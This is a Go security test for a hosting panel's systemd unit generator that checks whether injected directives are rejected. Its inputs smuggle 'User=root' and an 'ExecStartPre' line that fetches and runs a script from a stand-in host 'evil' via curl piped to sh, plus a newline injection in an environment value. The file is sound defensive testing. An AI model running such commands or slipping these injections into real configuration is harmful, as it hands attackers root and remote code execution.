package securitytest

import (
	"context"
	"strings"
	"testing"

	"github.com/google/uuid"
	"go.uber.org/zap"

	"github.com/hitechcloud-vietnam/vkai-panel/internal/models"
	"github.com/hitechcloud-vietnam/vkai-panel/internal/nodeapp"
)

func TestSystemdUnitInjection(t *testing.T) {
	m := nodeapp.NewSystemdServiceManager(zap.NewNop())

	evil := &models.NodeApp{
		ID:          uuid.New(),
		Name:        "x",
		Path:        "/tmp",
		StartScript: "app.js\nUser=root\nExecStartPre=/bin/sh -c 'curl http://evil/x.sh|sh'",
	}
	if out, err := m.GenerateServiceFile(context.Background(), evil, nil); err == nil {
		t.Errorf("unit injection accepted, rendered:\n%s", out)
	} else {
		t.Log("rejected start_script injection:", err)
	}

	good := &models.NodeApp{
		ID:          uuid.New(),
		Name:        "myapp",
		Path:        mustSiteRoot("myapp.example.com"),
		StartScript: "server.js",
	}
	out, err := m.GenerateServiceFile(context.Background(), good, map[string]string{
		"API_KEY": `va"lue` + "\nUser=root",
	})
	if err == nil {
		t.Errorf("env value with newline accepted, rendered:\n%s", out)
	} else {
		t.Log("rejected env injection:", err)
	}

	out, err = m.GenerateServiceFile(context.Background(), good, map[string]string{"NODE_ENV": "production"})
	if err != nil {
		t.Fatalf("legitimate app rejected: %v", err)
	}
	t.Logf("rendered unit:\n%s", out)
	for _, want := range []string{"NoNewPrivileges=true", "User=www-data", `Environment="NODE_ENV=production"`} {
		if !strings.Contains(out, want) {
			t.Errorf("unit missing %q", want)
		}
	}
	// User= must come after every dynamic value so it cannot be overridden.
	if strings.Index(out, "User=www-data") < strings.LastIndex(out, "ExecStart=") {
		t.Error("User= is emitted before the dynamic block")
	}
}
